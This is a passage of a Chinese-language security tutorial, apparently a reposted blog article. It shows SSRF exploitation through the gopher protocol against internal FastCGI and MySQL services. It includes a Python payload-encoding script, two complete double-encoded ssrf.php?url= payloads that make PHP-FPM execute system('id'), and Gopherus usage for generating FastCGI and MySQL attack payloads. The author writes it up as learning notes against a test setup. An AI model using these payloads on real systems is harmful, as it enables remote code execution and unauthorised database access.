![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gJCsqC7HwecyE6fpKdAEsjwFTDGvBG3kC0PcTd7BnINSFRx3kgOyGCA/640?wx_fmt=png)

然后对 fcg_exp.txt 文件里的 payload 进行 url 编码，这里通过如下脚本实现（脚本是我从网上白嫖的嘿嘿）：

```
# -*- coding: UTF-8 -*-
from urllib.parse import quote, unquote, urlencode
file = open('fcg_exp.txt','r')
payload = file.read()
print("gopher://127.0.0.1:9000/_"+quote(payload).replace("%0A","%0D").replace("%2F","/"))
```

执行上面的 python 脚本生成如下 payload：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5g4IgCTTpFIuuJHKIiapOZe6wW5wllC6WIzFociaqyqsJPby58EyN9XdgQ/640?wx_fmt=png)

这里还要对上面的 payload 进行二次 url 编码，然后将最终的 payload 内容放到? url = 后面发送过去：

```
ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2514%2504%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH56%250E%2504REQUEST_METHODPOST%2509%255BPHP_VALUEallow_url_include%2520%253D%2520On%250Ddisable_functions%2520%253D%2520%250Dsafe_mode%2520%253D%2520Off%250Dauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25008%2500%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----0vcdb34oju09b8fd-----%250D%2527%2529%253B%253F%253E
```

如下图所示，命令执行成功：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5giczhqLIHesIWOKBnGT1OaJ6GVFsCicjVq0JkINNHgaGl4Bgg50SnMmNg/640?wx_fmt=png)

### 使用 Gopherus 工具攻击

下载地址：https://github.com/tarunkant/Gopherus

该工具可以帮你生成符合 Gopher 协议格式的 payload，以利用 SSRF 攻击 Redis、FastCGI、MySql 等内网应用。

使用 Gopherus 工具生成攻击 FastCGI 的 payload：

```
python gopherus.py --exploit fastcgi
/var/www/html/index.php    # 这里输入的是一个已知存在的php文件
id    # 输入一个你要执行的命令
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gKwxqB3oA0V5sNwh7TvkGZl8RMeoNN7kHI8G6R0kDF1p54T83WUUoSQ/640?wx_fmt=png)

然后还是将得到的 payload 进行二次 url 编码，将最终得到的 payload 放到? url = 后面打过去过去：

```
ssrf.php?url=gopher%3A//127.0.0.1%3A9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP/1.1%250E%2502CONTENT_LENGTH54%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A//input%250F%2517SCRIPT_FILENAME/var/www/html/index.php%250D%2501DOCUMENT_ROOT/%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25006%2504%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5ghBvAIyFnyv73IqoCbsJQ6SRMMVLWdZtibf4eYrSHibG7eM1BBbxJ4FFw/640?wx_fmt=png)

命令执行成功。

攻击内网 MySql
----------

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gkMtMibgY2obDRWP5oVTj0BFujsHrWPBXHrSECTrFvVbbXUSgyQwgYuA/640?wx_fmt=png)

首先我们要先了解一下 MySql 数据库用户认证的过程。MySQL 分为服务端和客户端。MySQL 数据库用户认证采用的是 挑战 / 应答 的方式，即服务器生成该挑战码 (scramble) 并发送给客户端，客户端用挑战码将自己的密码进行加密后，并将相应的加密结果返回给服务器，服务器本地用挑战码的将用户的密码加密，如果加密的结果和用户返回的加密的结果相同则用户认证成功，从而完成用户认证的过程。

登录时需要用服务器发来的挑战码 (scramble) 将密码加密，但是当数据库用户密码为空时，加密后的密文也为空。客户端给服务端发的认证包就是相对固定的了。这样就无需交互了，可以通过 Gopher 协议来直接发送了。

测试环境如下：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gs0tBqCIAGhR0su6sMomJO9icHCibNELia5cVHQic45ibreRxYYiaEPMc2n4g/640?wx_fmt=png)

Ubuntu 服务器为 WEB 服务器，存在 SSRF 漏洞，且上面运行着 MySql 服务，用户名为 whoami，密码为空并允许空密码登录。

下面我们还是使用 Gopherus 工具生成攻击 Ubuntu 服务器本地 MySql 的 payload：

```
python gopherus.py --exploit mysql
whoami    # 登录用的用户名
show databases;    # 登录后要执行的sql语句
```

生成如下 payload：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gFJEQoRBokwEo9jInB7ZFW5IIVoeCtj4Yuo5QgdIWbcHwVGMqIzrMlQ/640?wx_fmt=png)

将得到的 paylaod 进行 url 二次编码，然后将最终的 payload 内容放到? url = 后面发送打过去就行了。

Ending......
------------

![](https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gOReBpiaBqDN0VfZHsY352dKjdgB4e0tzLibSELCib0YeCelibPHhYWC7tw/640?wx_fmt=jpeg)

本文多为笔者的学习总结，若有不当的地方还望各位经过的路过的大佬多多点评。

> 参考：https://blog.csdn.net/Ping_Pig/article/details/99412487
> 
> https://www.cnblogs.com/iors/p/9777571.html
> 
> https://blog.csdn.net/qq43625917/article/details/104528645?utmsource=app
> 
> https://xz.aliyun.com/t/2115
> 
> https://blog.csdn.net/weixin_36343353/article/details/112277580
> 
> https://blog.csdn.net/cj_Allen/article/details/106855893
> 
> https://www.redteaming.top/2019/07/15 / 浅析 Redis 中 SSRF 的利用 /#Redis 配合 gopher 协议进行 SSRF
> 
> https://bbs.ichunqiu.com/thread-58455-1-1.html
> 
> https://blog.chaitin.cn/gopher-attack-surfaces/
> 
> https://www.anquanke.com/post/id/197431#h2-6
> 
> https://www.anquanke.com/post/id/145519#h2-14

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

**推荐阅读：**

[![](https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibVuhxbHrBQLfbnMFFe9SJT41vUS1XzgC0VZGHjuzp8zia9gbH7HBDmCVia2biaeZhwzMt8ITMbEnGIA/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247494120&idx=2&sn=e659b4f88a4c40442d36d73f8eea9d96&chksm=ec1cbcd7db6b35c1f493151004956b010056cdcc6378d197aade5bd3c559a787d7b28e22e3e9&scene=21#wechat_redirect)

**点赞 在看 转发**  

原创投稿作者：Mr.Anonymous

博客: whoamianony.top

![](https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif)